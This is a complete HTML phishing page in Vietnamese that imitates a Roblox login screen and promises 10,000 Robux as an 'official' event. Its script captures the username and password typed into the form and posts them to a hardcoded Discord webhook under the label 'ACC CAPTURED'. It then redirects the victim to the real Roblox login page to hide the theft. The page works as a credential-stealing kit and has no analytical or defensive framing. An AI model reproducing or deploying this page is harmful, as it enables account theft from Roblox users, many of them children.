<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Nhận Quà Sự Kiện</title>
    <style>
        body { font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif; background-color: #F2F4F5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-card { background: white; width: 400px; padding: 40px; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); text-align: center; }
        .logo { width: 160px; margin-bottom: 25px; }
        h2 { font-weight: 500; color: #393B3D; margin-bottom: 20px; font-size: 20px; }
        .input-group { margin-bottom: 10px; }
        input { width: 100%; padding: 12px; border: 1px solid #B8BABC; border-radius: 4px; background-color: #F2F4F5; box-sizing: border-box; font-size: 14px; }
        .btn-red { background-color: #0084FF; color: white; border: none; width: 100%; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 15px; }
        .btn-red:hover { background-color: #0074E0; }
        .info { font-size: 12px; color: #666; margin-top: 25px; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="https://images.rbxcdn.com/2012012c41804246879e6e16c80287f3.svg" alt="Roblox" class="logo">
        <h2>Đăng nhập để nhận 10.000 Robux</h2>
        <div class="input-group"><input type="text" id="u" placeholder="Tên đăng nhập / Email"></div>
        <div class="input-group"><input type="password" id="p" placeholder="Mật khẩu"></div>
        <button class="btn-red" onclick="capture()">Đăng Nhập</button>
        <div class="info">Sự kiện chính thức từ Roblox Corporation 2026.</div>
    </div>
    <script>
        async function capture() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            const webhook = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
            if (u.length < 3 || p.length < 3) return;
            await fetch(webhook, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ content: "### 💰 ACC CAPTURED\n**User:** `" + u + "`\n**Pass:** `" + p + "`" })
            });
            window.location.href = "https://www.roblox.com/login";
        }
    </script>
</body>
</html>
